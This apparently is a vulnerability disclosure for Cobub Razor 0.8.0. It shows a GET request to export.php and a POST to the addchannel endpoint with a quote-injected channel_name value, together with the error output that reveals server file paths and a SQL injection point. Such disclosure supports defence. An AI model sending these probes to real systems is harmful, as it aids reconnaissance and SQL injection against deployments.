
## This physical path Leakage exists in Western Bridge Cobub Razor 0.8.0 via a /index.php?/manage/channel/addchannel and /export.php request. ##

The pages leaked the absolute path:  
http://localhost/export.php  
GET method  
Result:
```
Notice: Undefined index: type in D:\phpStudy\PHPTutorial\WWW\export.php on line 22

Notice: Undefined index: svg in D:\phpStudy\PHPTutorial\WWW\export.php on line 23

Notice: Undefined index: filename in D:\phpStudy\PHPTutorial\WWW\export.php on line 24

Notice: Undefined variable: ext in D:\phpStudy\PHPTutorial\WWW\export.php on line 52

Notice: Undefined variable: ext in D:\phpStudy\PHPTutorial\WWW\export.php on line 94
Invalid type
```
![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_lackage_1.png)  

http://localhost/index.php?/manage/channel/addchannel  
POST method:channel_name=test"&platform=1  
Result:
```
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '123"' at line 3

select * from razor_channel where (user_id = "1" or type="system") and active=1 and channel_name="test" " and platform="123"

Filename: D:\phpStudy\PHPTutorial\WWW\system\database\DB_driver.php

Line Number: 331
```  
![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_lackage_2.png)
